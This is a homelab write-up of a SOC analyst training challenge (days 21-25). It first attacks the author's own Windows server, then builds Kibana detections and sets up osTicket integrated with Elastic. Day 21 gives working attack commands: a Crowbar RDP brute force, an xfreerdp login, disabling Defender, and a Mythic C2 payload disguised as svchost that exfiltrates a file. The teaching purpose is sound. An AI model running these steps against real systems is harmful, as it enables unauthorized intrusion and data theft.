*This project is under construction.*
# MyDFIR 30 Day SOC Analyst Challenge (Part 5)

<img width="896" alt="Part 5 Header" src="https://github.com/user-attachments/assets/167d3e80-f73a-48f7-9bbe-b7b8792f367b" />

## Day 21: Mythic Agent Steup
Today's task will demonstrate how to perform a brute force attack, generate a Mythic agent, and establish a Command-and-Control session from a Windows server. This attack follows the attack diagram created on Day 19. However, there are a few things to prepare before initiating the attack. 

First, I created a fake `passwords.txt` file located on my Windows server. Within this text file is the password honeypot2024!.
<img width="961" alt="day21-1" src="https://github.com/user-attachments/assets/68b472bf-51a3-429e-8009-bc0fc9298c57" />

Next, I want change the password to this Windows server to honeypot2024! To do this, navigate to `Start menu > User name > Change account settings > Sign-in options > Password > Change`. 
<img width="959" alt="day21-2a" src="https://github.com/user-attachments/assets/5f2c3b3f-6583-4669-b89a-fabc33d02008" />

After entering the current password and new password, I found that this new password, honeypot2024!, did not meet the password policy requirements. Not a problem. I just needed to edit the group policy by changing the minimum password length and disable the requirement to meet password complexity. To do this, navigate to `Edit group policy` by typing `local group` in the search bar.
<img width="959" alt="day21-2d" src="https://github.com/user-attachments/assets/95b45bd0-ce15-4662-8970-8bf9665ce5fa" />

<img width="960" alt="day21-2e" src="https://github.com/user-attachments/assets/97466b96-76f4-4d9c-a220-4c575a4539d9" />

<img width="970" alt="day21-2f" src="https://github.com/user-attachments/assets/1920ceb7-cdc8-4960-ac54-4ba71bf33c08" />

<img width="957" alt="day21-2g" src="https://github.com/user-attachments/assets/5ce567f1-098b-4a76-a35a-1bd19728ba6a" />

<img width="897" alt="day21-2h" src="https://github.com/user-attachments/assets/f12fcd80-9810-4074-bbed-db92b22baaeb" />

Once those two changes were made to the group policy, I successfully updated the password to honeypot2024!.

Now that I have created the `passwords.txt` file and updated the account password on the Windows server, it is time to move onto to phase one of the attack. 

#### Phase 1: Initial Access
The goal of phase 1 is to gain access to the target machine using a common brute force attack tool to crack the password for the Administrator account.

To initiate the attack, I will utilize a Kali Linux machine. Kali Linux comes preloaded with a vast array of tools for various cybersecurity tasks, including tools for network analysis, web application testing, password cracking, wireless testing, reverse engineering, and more. 

There are several preexisting wordlists within Kali Linux found in `/usr/share/wordlists/`. This attack will utilize the rockyou.txt file. To unzip the file, run `sudo gunzip rockyou.txt.gz` and enter the default password `kali`.
<img width="954" alt="day21-3a" src="https://github.com/user-attachments/assets/87413db2-acee-4cda-bff1-94716d60a623" />

Running `cat rockyou.txt` will show all the list of commonly used passwords contained in the file. I only want to use the first 50 passwords listed in the file. To do this, I need to create a separate list, which will be in a file titled mydfir-wordlist.txt, by running `head -50 rockyou.txt > /home/kali/mydfir-wordlist.txt`. This command works by listing out the first 50 passwords in the `rockyou.txt` file and outputting those into a new file called `mydfir-wordlist.txt`.
<img width="959" alt="day21-3b" src="https://github.com/user-attachments/assets/6b57f7bb-4b06-4838-b48a-feb039798b93" />

Now, it's necessary to include honeypot2024! in the `mydfir-wordlist.txt` file. To do so, run `nano mydfir-wordlist.txt` to open the file in the Nano text editor. [Here](https://youtu.be/g2PU--TctAM) is a short video on the basics of using Nano.
<img width="959" alt="day21-3c" src="https://github.com/user-attachments/assets/9a128a53-159b-4cdd-b1b6-763144712c72" />

A tool called [Crowbar](https://github.com/galkan/crowbar) is going to do the brute forcing. After updating and upgrading the system repositories, to download the tool, run `sudo apt-get install -y crowbar`. Once installed, I ran the command `crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s 45.32.40.253/32` to initiate the attack. Let's break this command down:
* `crowbar`specifies the tool to be used.
* The `-b` flag specifies the type of brute-force attack. (RDP)
* The `-u` flag specifies what username to use during the attack. (Administrator)
* The `-c` flag specifies the path to a wordlist file containing passwords to be tried. (mydfir-wordlist.txt)
* The `-s` flag specifies the target IP address. (45.32.40.253/32)

From the screen shot below, we can see that it only took 10 seconds for Crowbar to crack the password.

Now, to authenticate into the Windows server, RDP into the server with `xfreerdp` by running `xfreerdp /u:Administrator /p:honeypot2024! /v:45.32.40.253:3389`. This command initiates an RDP session by logging into the server at the specified IP address using port `3389`, which is the default port for RDP, using the username `Administrator` and password `honeypot2024!`.
<img width="955" alt="day21-5" src="https://github.com/user-attachments/assets/82af3a43-2b41-4093-b582-c93d285e61a3" />

#### Phase 2: Discovery
Phase 2 is all about gathering critical information about the target environment. The goal is to identify as many assets, systems, and configurations as possible to better understand the network and determine how to proceed.

Some basic discovery commands iclude:
* `whoami`: provides information about the currently logged-in user.
* `ipconfig`: provides detailed information about the network configuration of a Windows system.
<img width="956" alt="day21-5b" src="https://github.com/user-attachments/assets/e8262b50-262c-4cd9-b215-b5335523ec1c" />
* `net user`: provides information about user accounts on a Windows system.
* `net user username`: provides detailed information about the specified user account.
* `net group`: provides information about and manages group accounts in a Windows domain.
<img width="958" alt="day21-5c" src="https://github.com/user-attachments/assets/59f255b0-0893-4ae7-bea6-ad0065b12ad3" />

#### Phase 3: Defense Evasion
The goal of defense evasion is to avoid detection by the target's security systems and maintain stealthy access to the compromised environment. It focuses on bypassing or disabling security measures to prolong the attack and minimize the chance of discovery.

In this case, I disable Windows Defender via the GUI. 
<img width="954" alt="day21-6" src="https://github.com/user-attachments/assets/2219b1fc-522c-495c-9061-4aa84f1266fe" />

In a more advanced, real-world scenario, in addition to avoiding detection by security tools, attackers may also take measures to obfusicate or masquerade their activity, establish persistence, or even clean up any evidence of their existence.

#### Phase 4: Execution
This phase  focuses on running malicious commands, scripts, or payloads on the compromised system. This phase is pivotal as it enables attackers to achieve their objectives, such as establishing control, gathering information, or preparing for further stages of the attack. Here, I set up a persistent and reliable connection to the C2 infrastructure under my control.

First, I need to set up an agent within my Mythic instance. Working from my Mythic server, I downloaded and installed the [Apollo Mythic agent](https://github.com/MythicAgents/Apollo.git) from GitHub by running `./mythic-cli install github https://github.com/MythicAgents/Apollo.git`. 
<img width="961" alt="day21-7a" src="https://github.com/user-attachments/assets/033358e1-99e0-4f21-9d84-55fc656e88da" />

This [Agent Capabilities Matrix](https://mythicmeta.github.io/overview/agent_matrix.html) is a useful resource for determining which agent is good dependent upon operational conditions.

After a few moments, I can see from PowerShell and my Mythic web GUI that Apollo has been successfully installed.
<img width="948" alt="day21-7b" src="https://github.com/user-attachments/assets/704efa94-868b-4b59-9e85-873381aeee1a" />
<img width="959" alt="day21-7c" src="https://github.com/user-attachments/assets/b29f3454-5bca-4604-8069-dd039d81f3ca" />

Next, a C2 profile is needed. [This GitHub repository](https://github.com/MythicC2Profiles) contains all the information needed to set up the profile. In this case, I am using the http profile.
![image](https://github.com/user-attachments/assets/059f8f45-0b0c-49d2-9ee0-92c420a9254a)
![image](https://github.com/user-attachments/assets/9c31917f-f72e-46b7-980f-c11e47a77592)
![image](https://github.com/user-attachments/assets/afdee3c4-5c9a-4f58-8c78-46666a8c5e58)

To install the http C2 profile, I ran `./mythic-cli install github https://github.com/MythicC2Profiles/http`. 
<img width="960" alt="day21-8a" src="https://github.com/user-attachments/assets/83c5cf49-8b78-4f26-9872-b7f8c1d911f3" />

Returning to my Mythic web GUI, I now see an Agent and C2 Profile.
<img width="960" alt="day21-8c" src="https://github.com/user-attachments/assets/9440e97c-66cf-4f26-b546-891150cb3507" />

To create a payload, navigate to the biohazard icon and choose `Actions > Generate new payload`. 
<img width="959" alt="day21-9" src="https://github.com/user-attachments/assets/62fc03a9-bc9a-420f-bf9a-4d5ccec30e9d" />

Now, Mythic will guide you through the steps to create the payload. First, select the designated target system.
<img width="962" alt="day21-9a" src="https://github.com/user-attachments/assets/7bb2bd1c-243d-4745-8346-92f6e402e62b" />

Then, there are several options as how to output the payload (shellcode, executable, service).
<img width="958" alt="day21-9b" src="https://github.com/user-attachments/assets/5c23f153-3bf6-4f90-9fc8-d6ea17ca5ba1" />

A nice feature of Mythic is that it provides you with the available commands for use allowing for greater customization. You can also click on the `Documentation` button to learn more about each command.
<img width="958" alt="day21-9c" src="https://github.com/user-attachments/assets/5d6ad7b1-57c1-4233-abc9-ac2e48db997c" />

Next, it is necessary to provide your Mythic server's public IP address as the callback address. After all, we want to be notified about what is going on.
<img width="961" alt="day21-9d" src="https://github.com/user-attachments/assets/1b850c1d-1fc4-4f1a-9912-13acce430ff0" />

Finally, name and describe the payload.
<img width="958" alt="day21-9e" src="https://github.com/user-attachments/assets/88d4e404-d793-45a8-9086-3a86fe9e80d9" />

#### Phase 5: Command and Control
This is the pivotal moment of many C2 attacks. Here we will establish and maintain a communication channel between the attacker and the compromised system. 

The payload is ready to be downloaded. I ran the `wget` command in PowerShell from the Mythic server using the download link provided by Mythic. An error occurs but is easily resolved by adding `--no-check-certificate` to the end of the command.
<img width="959" alt="day21-9f" src="https://github.com/user-attachments/assets/dbdcc0a5-619f-4dbb-bc26-96efab1b2dba" />

Now, the file is available and I can see that it is a PE32 executable. I also renamed the file to `svchost-jf.exe` and moved it to the newly created `1` directory.
<img width="961" alt="day21-9g" src="https://github.com/user-attachments/assets/de61a724-d511-41b8-97a6-cb58cc6f0d59" />

Utilizing an HTTP module that python offers to provide the necessary framework and functionality to facilitate communication, data exchange, and execution over the HTTP protocol. 
<img width="960" alt="day21-10" src="https://github.com/user-attachments/assets/99b5e182-31ac-46e9-891c-696f0556150d" />

Moving back to the previously established RDP session on the Kali Linux machine, I invoked a web request to download the payload.
<img width="958" alt="day21-10a" src="https://github.com/user-attachments/assets/43c6aa4e-2b20-44da-b205-52fe422fd64e" />

Now, running `./svchost-jf.exe`, will establish a connection with my Mythic agent. Moving over to my Mythic web GUI, I can see that I now have an active callback.
<img width="962" alt="day21-10b" src="https://github.com/user-attachments/assets/1a4689a4-2f1e-4189-8641-13197c4dc6df" />

#### Phase 6: Exfiltration
The exfiltration stage is often the primary objective in many cyberattacks, particularly those driven by espionage, fraud, or ransomware. Successful exfiltration allows the attacker to capitalize on the stolen data, whether for financial gain, competitive advantage, or further malicious actions. Additionally, it can significantly harm the targeted organization in terms of financial loss, reputation damage, and regulatory consequences.

Now that C2 has been established, I have the ability to execute commands on the target machine from my Mythic web GUI.
<img width="962" alt="day21-10b" src="https://github.com/user-attachments/assets/b0dc3abc-43a8-4d8b-88b0-25ef6cc91cb2" />

To download a file from the target machine, run `download file path`. To download the `passwords.txt` file that was created, I ran `download C:\Users\Administrator\Documents\passwords.txt`. I can even see a preview of the documents data.
<img width="958" alt="day21-10c" src="https://github.com/user-attachments/assets/b7a2f719-02dd-460f-9efa-6f782b4f23f6" />

To view the entire document and a list of other downloaded files, navigate to the paperclip icon located on the top toolbar.
<img width="958" alt="day21-10d" src="https://github.com/user-attachments/assets/8c73a11f-1c5c-483b-bbe5-ee932665b75f" />

#### Summary
Today's task demonstrated the process of performing a brute force attack, establishing a Command-and-Control (C2) session, and exfiltrating data from a compromised Windows server. The attack proceeded through several key phases, starting with gaining initial access using Crowbar and continuing with discovery, defense evasion, and the execution of malicious payloads using Mythic. Once control was established, we used the Mythic agent to set up a reliable C2 channel and exfiltrated sensitive data from the target system. This exercise highlights the importance of each phase in a C2 attack, emphasizing how attackers can infiltrate, control, and extract critical information from a vulnerable network. Finally, Mythic is a powerful framework. Please use it responsibly.

## Day 22: Creating Alerts & Dashboards in Kibana (4/4)
Now that the Mythic agent is up and running, I want to create an alert that will capture the generated telemetry and visualize it with an associated dashboard.

Returning to the Elastic web GUI, under the hamburger menu, navigate to `Analytics > Discover`, I am going to define custom search parameters for this alert which will feed the visualization. 

To locate the C2 telemetry, I search for the payload I created and deployed yesterday, called `svchost-jf.exe`. In a real-world scenario, this information wouldn't be readily available, but this is for educational purposes, so I am cheating a little to get started.

To further hone these results, I want to focus on `event.code: 1`, Sysmon Process Create which contains the MD5 hash which can be used to try and gain additional information. The custom search so far is: `svchost-jf.exe and event.code: 1`. This search returns just one result.

Delving into this event's details, one particular field stands out: `winlog.event_data.OriginalFileName: Apollo.exe`, which was an executable used in the C2 attack. This will be included in the custom search parameters. 

The SHA256 hash could be useful even though it is quite easy for attackers to modify. 

In the end, my custom search is: `event.code: 1 and (winlog.event_data.Hashes: 0D2AA0566EAC0BE21B03982D79B73FBB9BEE93E543F82BEB229C25946EBE5243 or winlog.event_data.OriginalFileName: Apollo.exe)`. 

Breaking this search down,
+ `event.code: 1` filters for logs that have an `event.code` value of `1`.
+ `(winlog.event_data.Hashes: 0D2AA0566EAC0BE21B03982D79B73FBB9BEE93E543F82BEB229C25946EBE5243 or winlog.event_data.OriginalFileName: Apollo.exe)` is a logical OR condition combining two fields for filtering.
  - `winlog.event_data.Hashes: 0D2AA0566EAC0BE21B03982D79B73FBB9BEE93E543F82BEB229C25946EBE5243` will match logs where the file’s hash matches this specific value.
  - `winlog.event_data.OriginalFileName: Apollo.exe` filters logs for events related to a file named `Apollo.exe`.
*`svchost-jf.exe` is removed because it could potentially return unwanted results.*

This query is looking for events where a particular action occurred (event code 1) that involves either a file with a specific hash or the execution of a file named `Apollo.exe`.

To create a new security rule, under the hamburger icon, navigate to `Security > Rules > Detection rules > Create new rule > Custom query` and paste in the custom search.
<img width="959" alt="Day22-1a" src="https://github.com/user-attachments/assets/fec8778b-169d-4d4e-9cb8-72b6b0e84e11" />

After defining the desired required fields, naming and describing the rule, assigning a severity level, and scheduling the rule, it was created and enabled.
<img width="959" alt="Day22-1b" src="https://github.com/user-attachments/assets/4e34915d-002f-4c40-8440-df09488776b0" />
<img width="958" alt="Day22-1c" src="https://github.com/user-attachments/assets/20afd3e9-97cc-4445-8a57-f150537de1e1" />

<img width="961" alt="Day22-1d" src="https://github.com/user-attachments/assets/9984e257-19ca-4d87-a264-8c8dc7569bc6" />

#### The Dashboard
This dashboard will display three panels:
+ The first panel will focus on detecting when any process is started on the system.
  - The search parameters for this panel are: `event.code: 1 and event.provider: Microsoft-Windows-Sysmon and (powershell, cmd, rundll32)`.
  - `event.code: 1` filters for any process creation event (Event ID 1 in Sysmon). 
  - `event.provider: Microsoft-Windows-Sysmon` specifies that the event should come from Sysmon.
  - `(powershell, cmd, rundll32)` looks for any of the three specified processes.
  ![app_dashboards1](https://github.com/user-attachments/assets/c3d33e80-422b-4a94-a79b-feca4a1b22b2)

+ The second panel will focus any processes initiating an outbound network connection.
  - The search parameters are: `event.code: 3 and event.provider: Microsoft-Windows-Sysmon and winlog.event_data.Initiated: "true"`.
  - `event.code: 3` filters for Sysmon events that record network activity, specifically any successful network connections.
  - `event.provider: Microsoft-Windows-Sysmon` specifies that the event should come from Sysmon.
  - `winlog.event_data.Initiated: "true"` filters for events where the `Initiated field` is set to `"true"`. In the context of network connections, Initiated: "true" typically indicates outbound connections made from the monitored system to an external destination.
![app_dashboards2](https://github.com/user-attachments/assets/97e44364-739f-41c3-93a9-dff6a4a2cd46)

+ The third panel will focus on the Windows real-time protection being disabled.
  - The search parameters are: `event.code: 5001 and event.provider: "Microsoft-Windows-Windows Defender"`.
  - `event.code: 5001` filters for the disabling of Microsoft Defender Antivirus real-time protection scanning for malware and other potentially unwanted software.
  - `event.provider: "Microsoft-Windows-Windows Defender"` filters logs to only include those generated by Microsoft-Windows-Windows Defender.
![app_dashboards3](https://github.com/user-attachments/assets/a0b6658b-b9ec-42d7-98e6-55d958107a56)

To create the visualization, navigate to the hamburger menu, `Dashboards > Create dashboard > Create visualization`. Once there, paste in the custom search parameters and format to suit your specific needs. In this case, `winlog.event_data.Image`, `winlog.event_data.DestinationIp`, `winlog.event_data.SourceIp`, `winlog.event_data.DestinationPort` provide all the necessary information.

By defining search queries that focus on specific events—such as process creation, outbound network connections, and Defender activity—we were able to build an insightful and actionable security dashboard. The custom alerts provide an efficient way to track suspicious behaviors, while the dashboard visualizations make it easy to monitor key indicators in real time. With this setup, I am now equipped to detect and respond to potential threats with greater visibility and precision.

## DAY 23: Ticketing Systems
In a Security Operations Center (SOC) environment, the ticketing system is a critical tool used to manage, track, and resolve security incidents, alerts, and issues. It acts as a centralized platform for documenting all activities from detection through resolution, ensuring that no incidents are overlooked and that responses are coordinated and efficient. It also provides accounting, or the final A of the AAA framework.

Tickets can be many things. They can be security alerts, troubleshooting requests, or even customer complaints. In a SOC enviroment, a ticketing system serves several key functions.
1. __Incident Tracking:__ When a security alert or incident is triggered a ticket can be automatically or manually created to track the progress of the investigation and response.
2. __Prioritization and Categorization:__ Tickets can be categorized based on severity and urgency helping teams prioritize their response and allocate resources effectively.
3. __Collaboration and Communication:__ Multiple analysts can be assigned to a ticket. The system can provide a platform for communication among team members, enabling collaboration on investigations and remediation efforts.
4. __Documentation:__ All actions taken related to the incident can be documented in the ticket. This helps ensure compliance, provides a record for future audits, and enables lessons learned to improve response processes.
5. __Escalation:__ If a ticket cannot be resolved within the expected time frame or requires specialized expertise, it can be escalated to higher-level analysts or a different team.
6. __Reporting and Metrics:__ The ticketing system typically has reporting capabilities that allow SOC managers to monitor key performance indicators such as mean time to detect (MTTD), mean time to respond (MTTR), ticket closure times, and other metrics that are important for evaluating SOC performance.
7. __Integration with Other Tools:__ A modern ticketing system in a SOC is often integrated with other security tools, such as SIEM systems, threat intelligence platforms, or incident response tools, which can be configured to automatically create tickets when alerts are triggered.
8. __Audit Trails:__ The system maintains an audit trail of all activities performed on each ticket, which is important for accountability, forensic investigations, and compliance with regulations.

Common commercially available ticketing systems include [Jira](https://www.atlassian.com/software/jira), [servicenow](https://www.servicenow.com/), [Freshdesk](https://www.freshworks.com/freshdesk/), and [zendesk](https://www.zendesk.com).

[osTicket](https://osticket.com/) is an open source product that offers features that can fulfill many of the core responsibilities of a commercially available ticketing system. It has the ability to customize fields, create filters for routing, assign and transfer tickets, and even an option to set a service level agreement. It can operate as self-hosted or, for a fee, the company will manage it for you.

By integrating osTicket into this tech stack it will begin to mimic a small SOC environment. Because a ticketing system is such a vital tool used to manage, track, and document security incidents, events, and operational tasks, a well-implemented ticketing system is essential for efficient and effective SOC operations, ensuring that security incidents are handled promptly and systematically.

## Day 24: osTicket Setup
Now that we know what a ticketing system is, let's set up osTicket. 

#### Deploy Server in VPC
To get started, I deployed a new, dedicated server running on a Windows Standoard 2022 operating system within my VPC network. Once the server was set up, I integrated it into my firewall group.

#### Set up Web Server
Next, I connected directly to this new virtual machine via remote desktop protocol (RDP) to set up a web server. To do this, I used `xampp`. Google `xampp` to find the [dowload link](https://www.apachefriends.org/download.html). Once the installer downloaded, I opened the file to run the installer leaving the default settings in place. 
<img width="948" alt="Day24-1" src="https://github.com/user-attachments/assets/1c288a37-b5b7-4c27-919d-1bd99fc2043b" />

Once installation is complete, you will see the `xampp` control panel. 
<img width="958" alt="Day24-1a" src="https://github.com/user-attachments/assets/c0574c87-8ff8-4867-a26b-2f1a65c12689" />

Now, I want to authorize this server's public IP address to access the `phpMyAdmin` of this `Apache` instance. To do so, navigate to the xampp control panel and start the `Apache` and `MySQL` services. Once those are running, go to `Admin` under the Apache service. 
<img width="957" alt="Day24-4" src="https://github.com/user-attachments/assets/0470562e-e1ad-4faf-949f-38af37820c1f" />

When the web page loads, go to `phpMyAdmin` at the top of the page.
<img width="953" alt="Day24-5" src="https://github.com/user-attachments/assets/eef94c58-7f9d-4f97-9980-31944b2e8eda" />

Navigate to `User Accounts`.
<img width="959" alt="Day24-5a" src="https://github.com/user-attachments/assets/7740179b-8528-459b-9bd1-b3b9180a58ef" />

Select the username `root` with the hostname `localhost`.
<img width="956" alt="Day24-5b" src="https://github.com/user-attachments/assets/613c46c8-ae34-471d-844b-6e9aa4b69d3b" />

Select `Login Information~ at the top of the page. 
<img width="958" alt="Day24-5c" src="https://github.com/user-attachments/assets/b76dbc85-7de0-4563-98b0-fc66cae341ba" />

Change the `Host name` from `localhost` to the server's public IP address and configure a password. 
<img width="959" alt="Day24-5d" src="https://github.com/user-attachments/assets/d23f5895-36ec-43cc-9031-85c56cb2e26e" />

Now, before going any further, I need to edit the properties configuration file located in `C:\xampp\properties.txt`. I need to change `apache_domainname` from `127.0.0.1 (localhost)` to my server’s public IP, which is `45.76.213.92`.
<img width="959" alt="Day24-2" src="https://github.com/user-attachments/assets/8a91bc4c-3df5-4b80-872f-9518b4dd1a6e" />
Save and exit.

Next, change the phpMyAdmin configuration file located at `C:\xampp\phpMyAdmin\config.inc.php`. Before making any changes to this file I created a backup file by copying the original and renaming it `config.inc.backup.php`.

I opened the file with Notepad and changed `/* Bind to the localhost ipv4 address and tcp */
$cfg['Servers'][$i]['host'] = '127.0.0.1';` to use my server's public IP address, `/* Bind to the localhost ipv4 address and tcp */
$cfg['Servers'][$i]['host'] = '45.76.213.92'`. 
<img width="959" alt="Day24-2a" src="https://github.com/user-attachments/assets/c1c080d5-0d3b-482e-8d72-1079d6170446" />
Save and exit.

This change allows access via my SOC analyst laptop and restricts unauthorized access to the virtual machine.

Note, do not forget to update the password in your phpMyAdmin configuration file (`config.inc.php`).
<img width="959" alt="Day24-5e" src="https://github.com/user-attachments/assets/fa00e882-81e2-48ca-940e-ff59f15a1aad" />

The final step of this section is to create an endpoint firewall rule with Windows Defender Firewall with Advanced Security to allow inbound connections via ports 80 and 443. To do this, click `New Rule` and follow the prompts. Specifically, select `Port > TCP`, enter `80,443`,  `Allow COnnection`, and name it `Inbound 80,443`.
<img width="957" alt="Day24-3" src="https://github.com/user-attachments/assets/6887c6a9-2d45-4c11-9849-b5eae6907c89" />

#### Installing osTicket
Navigate to `osTicket.com > Self-Hosted > [Download](https://osticket.com/download/)` and download the most recent version. Select your desired language and plugins configurations then download. Once the file is downloaded, extract its contents. Once that finishes extracting, you will need to extract the contents of another folder. 

The default web contents for the Apache server are stored in `c:\xampp\htdocs`. Here, I will create a new directory called `osTicket`. 

Next, once the above osTicket download has finished extracting, copy the `scripts` and `uploads` directories from the extracted folded and paste it to the newly created directory `C:\xampp\htdocs\osTicket`.

Now, open a web browser and navigate to `serverIP/osticket/setup`.
<img width="959" alt="Day24-6" src="https://github.com/user-attachments/assets/9505b71c-6ae4-4ec0-93cf-f88b195b8323" />

Once there, click `Continue` at the bottom of the page and you should get a warning that a configuration file is missing.
Fortunately, the fix to thois issue is provided.
<img width="957" alt="Day24-6a" src="https://github.com/user-attachments/assets/2687bf9c-47e9-41c2-bb82-e98459b5b36c" />

The file to rename is located in `C:\xampp\htdocs\osTicket\uploads\include` directory which is part of the directory that was just moved from `Downloads`.
<img width="956" alt="Day24-6b" src="https://github.com/user-attachments/assets/5e519513-ef6b-4b08-b81e-e379b8f7a70d" />

After renaming the file, return to the web browser and click `Continue` which brings you to the basic installation information. Once the basic system settings have been filled in, it's time to setup a new database. The most important detail here is to enter the server's public IP address in the `MySQL Hostname` field.
<img width="955" alt="Day24-6c" src="https://github.com/user-attachments/assets/6959032e-fc67-484e-b1e9-ffa601c4404e" />

Click `Install Now`. I immediately encountered an error.
<img width="960" alt="Day24-6d" src="https://github.com/user-attachments/assets/2d423f37-eaab-4c07-a2ac-9ea0db9148f3" />

This is because the MySQL database was not created. What just happened was editing the database settings. It was not actual creation of a database. To fix this, first create a database before running the osTicket installation. 

From the xampp control panel navigate to the `phpMyAdmin` page by clicking on the `Admin` button.
<img width="957" alt="Day24-4" src="https://github.com/user-attachments/assets/b40c5d3a-883d-4a55-8506-cf9b868f692c" />
<img width="953" alt="Day24-5" src="https://github.com/user-attachments/assets/4733dc6d-22ae-4a64-ac03-8d62c2508f9f" />

A list of databases is located in the lafthand column of the page. From here select the `Databases` tab at the top of the page, click `New` to create a new database, name the database, and click `Create`.
<img width="958" alt="Day24-6e" src="https://github.com/user-attachments/assets/7ae54ca0-8a43-4936-bc83-f8294b38b750" />

The database should now be listed in the lefthand column. 
<img width="960" alt="Day24-6f" src="https://github.com/user-attachments/assets/bd881d6b-d8b8-46c4-83f5-a52147283b0f" />

Next, ensure the proper privileges are granted to access database. Click the home icon at the top of the lefthand column. Navigate to `user accounts - root (with public IP) - database - go`.
<img width="960" alt="Day24-6g" src="https://github.com/user-attachments/assets/d7820c28-a57f-4dee-8168-34b929416ba4" />

Here, make sure to select `Check all`.
<img width="958" alt="Day24-6h" src="https://github.com/user-attachments/assets/990a706d-8aea-4ac9-94f8-1da5fd9ff5bb" />

This provided privileges to this database for the root account. Now, rerun the osTicket configuration steps. In a web browser, go to `serverIP/osticket/upload` which will take you back to the osTicket installer. Input the required information (again 🙁), and click `Install Now`. If done right, you'll see a congratulatory message like this.
<img width="959" alt="Day24-6i" src="https://github.com/user-attachments/assets/62961fbc-a602-4c03-bf6b-9cabd6b46478" />

#### Configuring File Permissions
Luckily, commands are provided (see previous screenshot). I used PowerShell, running it as an administrator. Before running the command, I changed into the directory where the `ost-config.php` file is located by first running
`cd C:\xampp\htdocs\osTicket\uploads\include` and then ran the `icalcs include\ost-config.php /reset` command as provided. 

However, this failed because the system could not find the specified path. Instead, I ran `icalcs .\ost-config.php /reset` and was successful.
<img width="960" alt="Day24-6j" src="https://github.com/user-attachments/assets/5ec8cccc-9ada-4735-b92e-0e8e0ed59630" />

Now is a good time to take note of `Your os Ticket URL` and `Your Staff Control Panel` links provided.
<img width="959" alt="Day24-6iI" src="https://github.com/user-attachments/assets/80cf84f4-da19-4eff-ade0-6d4ecb8e6f94" />

#### Confirming Successful Installation
Back on my host computer, I navigated to the `Your Staff Control Panel` link that was provided and logged in with my credentials.
<img width="958" alt="Day24-6k" src="https://github.com/user-attachments/assets/80b24f7f-808a-4a25-a6ca-bbec40163b27" />

If you click on `Admin Panel` located in the top right corner, you can begin to edit certain settings or even create agents.
<img width="957" alt="Day24-6l" src="https://github.com/user-attachments/assets/3713415b-965b-49e8-aa61-d821ae1d2d9e" />

#### Conclusion
Setting up osTicket involves several detailed steps, from deploying a server and configuring the web environment to installing and troubleshooting the ticketing system. By following these instructions, I successfully deployed osTicket and confirmed its functionality, enabling ticket management for my environment. This process not only provides a practical understanding of server and application deployment but also highlights the importance of precise configuration in creating reliable IT solutions. With osTicket fully operational, I am ready to explore its features and optimize it for my needs.

## Day 25: Integrating osTicket with ELK
Having osTicket installed and configured properly is nice, but it won't do me much good unless it is integrated with other aspects of my tech stack. The integration of osTicket with the ELK stack will enhance ticket management by providing centralized access to ticket data and system logs, improve real-time monitoring and alerting, and could enable advanced analytics. This integration helps support teams respond more efficiently, troubleshoot problems faster, and gain valuable insights to optimize workflows, improve performance, and proactively manage IT issues.

#### Generate API Key
To begin, log into the osTicket control panel and navigate to the `Admin Panel`.
<img width="958" alt="Day24-6k" src="https://github.com/user-attachments/assets/bfb25c82-e811-40a1-ac92-e8de449bca25" />

Once there, go to `Manage`, select `API`, and click `Add New API Key`.
<img width="960" alt="Day25-1" src="https://github.com/user-attachments/assets/0e4d1a9e-529a-47f7-addb-c999d7f69cfd" />

Now, because the osTicket server and ELK server are both a part of the same virtual private cloud (VPC), I will use the private IP address of my ELK server. If they were not part of the same VPC, I would use the public IP address instead.
Select `Can Create Tickets`, enter any `Internal Notes`, and click `Add Key`.
<img width="959" alt="Day25-1a" src="https://github.com/user-attachments/assets/a4c27fb4-1b5a-4a00-9a70-d6c20e16a113" />

After clicking `Add Key`, you are brought to a screen with your newly generated API key which will be use in Elastic to integrate osTicket. Copy it and keep it somewhere safe for now.
<img width="958" alt="Day25-1b" src="https://github.com/user-attachments/assets/84a59a53-39f9-4acc-ae9c-8602bf08bd65" />

#### Integration
Log into Elastic. Under the hamburger icon, navigate to `Management > Stack Managment > Alerts and Insights > Connectors > Create Connector`. 
<img width="959" alt="Day25-1c" src="https://github.com/user-attachments/assets/e40019ec-c921-476e-963e-528ac7568bf2" />

At this stage, it becomes necessary to enable the free 30-day trial because APIs are not available for use with a free license. Do this by clicking on `Manage License` and selecting `Start Trial`. 

Back to `Create Connector`. Now select `Webhook`. 

A webhook is a way for an application to send real-time data to another system or service when a specific event occurs. It allows for automatic notifications or data transfers between systems without the need for continuous polling or manual intervention by pushing data to the first system when triggered by an event.

Name the connector. The method in this case is a `POST` request. The URL is `http://osTicketIP/osticket/upload/api/tickets.xml`. Authentication is not necessary.
<img width="961" alt="Day25-1d" src="https://github.com/user-attachments/assets/db0571d9-8ea0-4e1b-b56e-252718fcf3af" />

Next, selct `Add HTTP Header`, enter `x-api-key` in the `Key` field, paste the API key generated by osTicket into the `Value` field, and click `Save and Test`.
<img width="959" alt="Day25-1e" src="https://github.com/user-attachments/assets/80b93f1e-7309-49ea-8bc3-ede7ce4ee757" />

Now, it asks to `Create an action`. Thankfully, the [osTicket GitHup page](https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md) provides an example to use. From the osTicket Github page, select and copy the `XML Payload Example` and paste it into the `Create an action` field. Click on `Run`.
<img width="959" alt="Day25-1f" src="https://github.com/user-attachments/assets/eb8578c3-7fa2-40a2-bcc8-7510b5215997" />

An error has occurred. The request failed, timeout of 60000ms exceeded tells me that this is a network connection issue. 
<img width="959" alt="Day25-1g" src="https://github.com/user-attachments/assets/6e33cec2-f432-443b-b83b-25051bf2ff41" />

To troubleshoot, I opened a PowerShell session on my host computer and established an SSH connection to my ELK server. When I tied to `ping` the osTicket server, I could not get a response.
<img width="957" alt="Day25-1h" src="https://github.com/user-attachments/assets/25b9cd22-b8b8-472b-914d-68a02087894e" />

After a bit more trouble shooting in my osTicket server RDP session, I found that the private IP address that I used earlier does not match the private IP address provided by the osTicket server when I ran `ipconfig` in Command Prompt.

To edit this, I opened up the Control Panel within the osTicket server, navigated to `Network and Internet > View network status and task > Change adapter settings > Ethernet Instance 0 > Properties > Internet protocol version 4 (TCP/IPv4)` and selected `Use the following IP address`. There, I entered the IP address and corresponding subnet mask that I want to use and clicked `OK`. 
<img width="958" alt="Day25-1i" src="https://github.com/user-attachments/assets/389a61a3-ebdd-48d5-976e-5b39045dde0b" />

